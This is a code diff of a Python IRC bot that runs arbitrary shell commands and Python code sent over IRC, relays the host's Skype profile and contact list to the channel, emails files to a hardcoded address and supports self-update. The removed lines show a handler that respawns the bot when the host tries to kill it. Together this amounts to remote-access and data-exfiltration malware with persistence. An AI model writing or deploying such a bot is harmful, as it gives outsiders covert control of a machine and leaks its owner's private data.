@@ -18,7 +18,7 @@ import skype
 #TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 
-version = "2.1.1"                                                   # bot version
+version = "~v1.0"                                                 # bot version
 
 def log(prefix, content=''):                                      # function used to log things to the console with a timestamp
     try:
@@ -67,23 +67,8 @@ Public Commands (main channel): \n
 
 ############ Flow functions
 
-def timeout_handler(signum, frame):                               # handler for timeout exceptions
+def handler(signum, frame):                                       # handler for timeout exceptions
     raise Exception("timedout")
-
-def sigterm_handler(signum, frame):                               # if user tries to kill python process, it will spawn another one
-    log('[#] ----Host attempted to shutdown bot----')
-    log('[#] ----Spawning subprocess----')
-    privmsg("----Host attempted to shutdown bot----")
-    quit_status = True
-    cmd = "sleep 15; python irc_bot.py > ./log.txt &"
-    log('[>]    CMD:     ',cmd)
-    p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
-    log('[#] ----Subprocess Spawned----')
-    privmsg('----Subprocess Spawned----')
-    irc.send ( 'QUIT\r\n' )
-    irc.close()
-    raise SystemExit
-    sys.exit()
 
 def line_split(seq, n):                                           # if output is multiline, split based on \n and max chars per line (n)
     output = []
@@ -125,7 +110,7 @@ def privmsg(msg=None, to=admin):                                  # function to 
         msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
         total = len(msgs)
         for num, line in enumerate(msgs):
-            signal.signal(signal.SIGALRM, timeout_handler)
+            signal.signal(signal.SIGALRM, handler)
             signal.alarm(1)                                       # doubles as flood prevention and input checking
             try:
                 data = irc.recv ( 4096 )
@@ -153,7 +138,7 @@ def broadcast(msg):                                               # function to 
 
 def run_shell(cmd, timeout=60, verbose=False):                    # verbose enables live command output via yield
    out = ''
-   signal.signal(signal.SIGALRM, timeout_handler)
+   signal.signal(signal.SIGALRM, handler)
    signal.alarm(timeout)
    try:
       p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
@@ -165,10 +150,10 @@ def run_shell(cmd, timeout=60, verbose=False):                    # verbose enab
       continue_running = 0
    signal.alarm(0)
    while(continue_running):
-      signal.signal(signal.SIGALRM, timeout_handler)
+      signal.signal(signal.SIGALRM, handler)
       signal.alarm(4)
       try:
-         signal.signal(signal.SIGALRM, timeout_handler)
+         signal.signal(signal.SIGALRM, handler)
          signal.alarm(2)
          try:
             line = p.stdout.readline()
@@ -206,24 +191,21 @@ def run_shell(cmd, timeout=60, verbose=False):                    # verbose enab
 
 def run_python(cmd):                                              # interactively interprets recieved python code
     try:
+        buffer = StringIO()
+        sys.stdout = buffer
+        exec(cmd)
+        sys.stdout = sys.__stdout__
+        out = buffer.getvalue()
+    except Exception as error:
+        out = error
+    out = str(out).strip()
+    if len(out) < 1:
         try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            exec(cmd)
-            sys.stdout = sys.__stdout__
-            out = buffer.getvalue()
+            out = "[eval]: "+str(eval(cmd))
         except Exception as error:
-            out = error
-        out = str(out).strip()
-        if len(out) < 1:
-            try:
-                out = "[eval]: "+str(eval(cmd))
-            except Exception as error:
-                out = "[eval]: "+str(error)
-        else:
-            out = "[exec]: "+out
-    except Exception as python_exception:
-        out = "[X]: %s" % python_exception
+            out = "[eval]: "+str(error)
+    else:
+        out = "[exec]: "+out
     return out.strip()
 
 def run(cmd, public=False):                                       # wrapper for run_shell which improves logging and responses
@@ -232,6 +214,7 @@ def run(cmd, public=False):                                       # wrapper for 
             broadcast(content)
         else:
             privmsg(content)
+
     out = ''
     cmd = cmd.strip()
     log("[+] Ran Command:")
@@ -386,155 +369,136 @@ if __name__ == '__main__':
     quit_status = False
 
     while not quit_status:
-        signal.signal(signal.SIGTERM, sigterm_handler)
+        timeout_count = 0
+        last_data = data = ''
+        log("[+] Connecting...")
+        log("[<]    Nick:        ", nick)
+        log("[<]    Server:      ", server+':'+str(port))
+        log("[<]    Room:        ", channel)
         try:
-            timeout_count = 0
-            last_data = data = ''
-            log("[+] Connecting...")
-            log("[<]    Nick:        ", nick)
-            log("[<]    Server:      ", server+':'+str(port))
-            log("[<]    Room:        ", channel)
+            irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            irc.settimeout(60)                                   # timeout for irc.recv
+            irc.connect((server, port))
+            recv = irc.recv ( 4096 )
+            log("[+] Recieved:    ", recv+'\n')
+            irc.send ('NICK %s\r\n' % nick )
+            irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
+            irc.send ('JOIN %s\r\n' % channel)
+            privmsg('Bot v%s Running.' % version)
+        except Exception as error:
+            log('[*] Connection Failed: ')
+            log('[X]    ',error)
+            timeout_count = 50
+            sleep(10)
+
+        while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
+            if (last_data == data):                              # IRC serves  will occasionally send lots of blank messages instead of disconnecting
+                timeout_count += 1
+            last_data = data
             try:
-                irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                irc.settimeout(60)                                   # timeout for irc.recv
-                irc.connect((server, port))
-                recv = irc.recv ( 4096 )
-                log("[+] Recieved:    ", recv+'\n')
-                irc.send ('NICK %s\r\n' % nick )
-                irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
-                irc.send ('JOIN %s\r\n' % channel)
-                privmsg('Bot v%s Running.' % version)
-                try:
-                    privmsg('Bot reloaded due to internal exception: %s' % e)
-                    del e
-                except NameError:
+                data = irc.recv ( 4096 )
+                log('[+] Recieved:')
+                log('[>]    ', data)
+            except socket.timeout:
+                if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
+                    log('[*] Disconnected.')
+                    timedout_count = 50
+                    break
+                else:
+                    data = str(time.time())
+                    timedout_count = 0
                     pass
-            except Exception as error:
-                log('[*] Connection Failed: ')
-                log('[X]    ',error)
+
+            ##Operation keyword matches
+            if data.find ('PING') != -1:
+                irc.send ('PONG ' + data.split()[1] + '\r')
+                last_ping = time.time()
+                log('[+] Sent Data:')
+                log('[<]    PONG ',data.split()[1])
+                timeout_count = 0    
+
+            elif data.find('ickname is already in use') != -1:
+                nick += str(random.randint(1,200))
+                if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
                 timeout_count = 50
-                sleep(10)
+                quit_status = False
+                break
 
-            while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
-                if (last_data == data):                              # IRC serves  will occasionally send lots of blank messages instead of disconnecting
-                    timeout_count += 1
-                last_data = data
+            ##Control keyword matches
+            elif scan('!quit') or privscan('quit'):
+                privmsg('Quitting.')
+                irc.send ( 'QUIT\r\n' )
+                quit_status = True
+
+            elif scan('!reload') or privscan('reload'):
+                privmsg('Reloading.')
+                irc.send ( 'QUIT\r\n' )
+                quit_status = False
+                break
+
+            ##Simple keywords with no arguments
+            elif scan('!update') or privscan('update'):        selfupdate()
+            elif scan('!version'):                             broadcast(version)
+            elif scan('!identify'):                            broadcast(identify())
+            elif privscan('help'):                             privmsg(helpmsg)
+            elif privscan('version'):                          privmsg(version)
+            elif privscan('identify'):                         full_identify()
+
+            ##Complex keywords with arguments
+            elif scan('email$'):
+                attch = data.split("$", 1)[1].split(',')
+                to = "nikisweeting+bot@gmail.com"
+                broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
+
+            elif privscan('skype$profile'):
                 try:
-                    data = irc.recv ( 4096 )
-                    log('[+] Recieved:')
-                    log('[>]    ', data)
-                except socket.timeout:
-                    if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
-                        log('[*] Disconnected.')
-                        timedout_count = 50
-                        break
-                    else:
-                        data = str(time.time())
-                        timedout_count = 0
-                        pass
+                    privmsg(skype.findProfile(local_user))
+                    db_path = skype.findProfile(local_user)
+                    for line in skype.printProfile(db_path):
+                        privmsg(line)
+                        sleep(1)
+                except Exception as error:
+                    privmsg(str(error))
 
-                ##Operation keyword matches
-                if data.find ('PING') != -1:
-                    irc.send ('PONG ' + data.split()[1] + '\r')
-                    last_ping = time.time()
-                    log('[+] Sent Data:')
-                    log('[<]    PONG ',data.split()[1])
-                    timeout_count = 0    
-
-                elif data.find('ickname is already in use') != -1:
-                    nick += str(random.randint(1,200))
-                    if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
-                    timeout_count = 50
-                    quit_status = False
-                    break
-
-                ##Control keyword matches
-                elif scan('!quit') or privscan('quit'):
-                    privmsg('Quitting.')
-                    irc.send ( 'QUIT\r\n' )
-                    quit_status = True
-
-                elif scan('!reload') or privscan('reload'):
-                    privmsg('Reloading.')
-                    irc.send ( 'QUIT\r\n' )
-                    quit_status = False
-                    break
-
-                ##Simple keywords with no arguments
-                elif scan('!update') or privscan('update'):        selfupdate()
-                elif scan('!version'):                             broadcast(version)
-                elif scan('!identify'):                            broadcast(identify())
-                elif privscan('help'):                             privmsg(helpmsg)
-                elif privscan('version'):                          privmsg(version)
-                elif privscan('identify'):                         full_identify()
-
-                ##Complex keywords with arguments
-                elif scan('email$'):
-                    attch = data.split("$", 1)[1].split(',')
-                    to = "nikisweeting+bot@gmail.com"
-                    broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
-
-                elif privscan('skype$profile'):
-                    try:
-                        privmsg(skype.findProfile(local_user))
-                        db_path = skype.findProfile(local_user)
-                        for line in skype.printProfile(db_path):
+            elif privscan('skype$contacts'):
+                try:
+                    db_path = skype.findProfile(local_user)
+                    for line in skype.printProfile(db_path):
+                        privmsg(line)
+                        sleep(1)
+                    for line in skype.printContacts(db_path):
+                        signal.signal(signal.SIGALRM, handler)
+                        signal.alarm(1)                              # doubles as flood prevention and input checking
+                        try:
+                            data = irc.recv ( 4096 )
+                            log('[+] Recieved:')
+                            log('[>]    ', data)
+                            if (data.find('!cancel') != -1):
+                                retcode = "Cancelled."
+                                privmsg("[X]: %s" % retcode)
+                                signal.alarm(0)
+                                break
+                        except:
                             privmsg(line)
-                            sleep(1)
-                    except Exception as error:
-                        privmsg(str(error))
+                        signal.alarm(0)
 
-                elif privscan('skype$contacts'):
-                    try:
-                        db_path = skype.findProfile(local_user)
-                        for line in skype.printProfile(db_path):
-                            privmsg(line)
-                            sleep(1)
-                        for line in skype.printContacts(db_path):
-                            signal.signal(signal.SIGALRM, timeout_handler)
-                            signal.alarm(1)                              # doubles as flood prevention and input checking
-                            try:
-                                data = irc.recv ( 4096 )
-                                log('[+] Recieved:')
-                                log('[>]    ', data)
-                                if (data.find('!cancel') != -1):
-                                    retcode = "Cancelled."
-                                    privmsg("[X]: %s" % retcode)
-                                    signal.alarm(0)
-                                    break
-                            except:
-                                privmsg(line)
-                            signal.alarm(0)
+                except Exception as error:
+                    privmsg(str(error))
 
-                    except Exception as error:
-                        privmsg(str(error))
+            elif scan('$'):
+                cmd = data.split("$", 1)[1]
+                run(cmd, public=True)
 
-                elif scan('$'):
-                    cmd = data.split("$", 1)[1]
-                    run(cmd, public=True)
+            elif privscan('$'):
+                cmd = data.split("$", 1)[1]
+                run(cmd, public=False)
 
-                elif privscan('$'):
-                    cmd = data.split("$", 1)[1]
-                    run(cmd, public=False)
+            elif privscan('>>>'):
+                cmd = data.split(">>>", 1)[1]
+                privmsg(run_python(cmd))
 
-                elif privscan('>>>'):
-                    cmd = data.split(">>>", 1)[1]
-                    try:
-                        privmsg(run_python(cmd))
-                    except Exception as python_exception:
-                        privmsg("[X]: %s" % python_exception)
+            elif scan('>>>'):
+                cmd = data.split(">>>", 1)[1]
+                broadcast(run_python(cmd))
 
-                elif scan('>>>'):
-                    cmd = data.split(">>>", 1)[1]
-                    try:
-                        broadcast(run_python(cmd))
-                    except Exception as python_exception:
-                        privmsg("[X]: %s" % python_exception)
-
-
-        except (KeyboardInterrupt, SystemExit):
-            break
-        except Exception as e:
-            log("[#] ----EXCEPTION---- ",e)
-        log("[*] EXIT")
-        
+    log("[*] EXIT")
